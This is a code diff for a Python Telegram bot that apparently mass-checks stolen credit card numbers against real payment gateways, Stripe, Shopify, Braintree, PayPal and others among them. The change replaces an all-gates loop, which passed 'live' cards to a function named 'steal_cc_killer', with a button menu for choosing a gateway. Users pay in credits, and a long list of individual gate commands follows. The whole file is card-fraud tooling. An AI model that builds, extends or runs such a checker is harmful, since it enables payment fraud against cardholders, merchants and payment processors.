@@ -590,6 +590,9 @@ async def mass_killer_cmd(client, message):
         res = results[card_cc]
         await steal_cc_killer(client, message, card_cc, res)
 
+# Store pending mass check data per user
+pending_mass_checks = {}
+
 @app.on_message(filters.command("mchk") & authorized_filter)
 async def mass_check_cmd(client, message):
     """📊 Mass CHECK - Regular single-gate check"""
@@ -609,43 +612,33 @@ async def mass_check_cmd(client, message):
     if not update_user_credits(message.from_user.id, -5):
         return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 5 Credits\nType /start to check balance.")
     
-    total = len(cards)
-    status_msg = await message.reply(f"📊 <b>Checking {total} cards...</b>")
+    # Store cards temporarily for this user
+    pending_mass_checks[message.from_user.id] = {
+        "cards": cards,
+        "message": message
+    }
     
-    async def update_status(checked, total):
-        if checked % 5 == 0 or checked == total:
-            try:
-                await status_msg.edit(f"📊 <b>Checking...</b> \nProgress: <code>[{checked}/{total}]</code>")
-            except: pass
-
-    # Use run_all_gates for simple check (fewer gates  than killer)
-    results = {}
-    checked = 0
-    for card in cards:
-        result = await run_all_gates(card)
-        results[card] = result
-        checked += 1
-        await update_status(checked, total)
+    # Show gate selection menu - ONE BUTTON PER ROW for clean look
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("💳 Stripe", callback_data="mchk_str")],
+        [InlineKeyboardButton("🛒 Shopify", callback_data="mchk_shp")],
+        [InlineKeyboardButton("🧠 Braintree", callback_data="mchk_btn")],
+        [InlineKeyboardButton("💰 PayPal", callback_data="mchk_ppal")],
+        [InlineKeyboardButton("🔷 NMI", callback_data="mchk_nmi")],
+        [InlineKeyboardButton("⚡ PayFlow", callback_data="mchk_payf")],
+        [InlineKeyboardButton("🔐 VBV 3D", callback_data="mchk_vbv")],
+        [InlineKeyboardButton("🎯 Stripe Auth", callback_data="mchk_as")],
+        [InlineKeyboardButton("🔑 Stripe SK", callback_data="mchk_sk")],
+        [InlineKeyboardButton("🚀 FastSpring", callback_data="mchk_fs")],
+        [InlineKeyboardButton("💀 KILLER (All Gates)", callback_data="mchk_killer")]
+    ])
     
-    lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
-    
-    report = f"""
-📊 <b>MASS CHECK COMPLETE</b>
-━━━━━━━━━━━━━━━━━━━━━━━
-📊 Stats: <b>{len(lives)}/{total} LIVE</b>
-✅ Live List:
-"""
-    for card_cc in lives[:10]:
-        report += f"• <code>{card_cc}</code>\n"
-    
-    if len(lives) > 10:
-        report += f"<i>...and {len(lives)-10} more</i>"
-        
-    await status_msg.edit(report)
-    
-    for card_cc in lives:
-        res = results[card_cc]
-        await steal_cc_killer(client, message, card_cc, res)
+    await message.reply(
+        f"📊 <b>Mass Check - Select Gate</b>\n\n"
+        f"📥 Cards loaded: <b>{len(cards)}</b>\n\n"
+        f"Choose which gate to use:",
+        reply_markup=keyboard
+    )
 
 @app.on_message(filters.command(["str", "btn", "rzp", "shp", "payu", "az", "hit", "nmi", "payf", "shpa", "vbv", "ppal", "ppavs", "as", "btnc", "ash", "sk", "skc", "nsk", "nsk2", "nsk3", "saw", "saw2", "saw3", "icvv", "iccn", "fs", "fsc", "ck", "bt", "bt2", "btc"]) & authorized_filter)
 async def individual_gate_check(client, message):
